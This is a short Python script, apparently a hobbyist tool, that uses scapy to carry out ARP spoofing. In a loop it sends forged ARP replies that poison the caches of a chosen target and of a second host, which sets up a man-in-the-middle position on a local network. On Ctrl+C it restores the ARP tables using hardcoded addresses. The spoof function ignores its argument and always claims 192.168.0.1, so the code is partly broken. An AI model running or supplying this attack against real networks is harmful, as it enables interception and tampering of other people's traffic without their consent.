#!/usr/bin/env python3 

import optparse
import scapy.all as scapy
import sys
import time

def get_arguments():
    parse = optparse.OptionParser()
    parse.add_option("-t","--target",dest ="target", help ="The machine witch we spuffing(client-ip-adress)")
    parse.add_option("-p","--present",dest="present",help="Present us as ...(IP -adress)")
    arguments = parse.parse_args()[0]
    if not arguments.target:
        parse.error("Pleade input IP adress of clinet")
    elif not arguments.present:
        parse.error("Please enter IP address that the client will see in the sender field of the packet")
    return arguments.target, arguments.present

def get_mac(ip):
    ip_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    ip_broadcast_request = broadcast / ip_request
    answered_list = scapy.srp(ip_broadcast_request,timeout = 10, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,target_mac,spoof_ip):
    packet = scapy.ARP(op = 2,pdst = target_ip, hwdst = target_mac, psrc ="192.168.0.1")
    scapy.send(packet,verbose = False)

def restore(destination_ip,sourse_ip):
    destination_mac = get_mac(destination_ip)
    sourse_mac = get_mac(sourse_ip)
    packet = scapy.ARP(op =2, pdst = destination_ip, hwdst = destination_mac, psrc = sourse_ip, hwsrc = sourse_mac)
    scapy.send(packet,count =4,verbose=False)

def main_function():
    target_ip,spoof_ip = get_arguments()
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packages_sent = 0
    while True:
        spoof(target_ip,target_mac,spoof_ip)
        spoof(spoof_ip,spoof_mac,target_ip)
        packages_sent += 2
        print("\r[+] Packages sent:",packages_sent,end='')
        sys.stdout.flush()
        time.sleep(2)
try:
    main_function()
except KeyboardInterrupt:
    print('[+] Detected CTRL+C ... Resetting ARP tables...Please wait.\n')
    target_ip = "192.168.0.144"
    gateway_ip = "192.168.0.1"
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)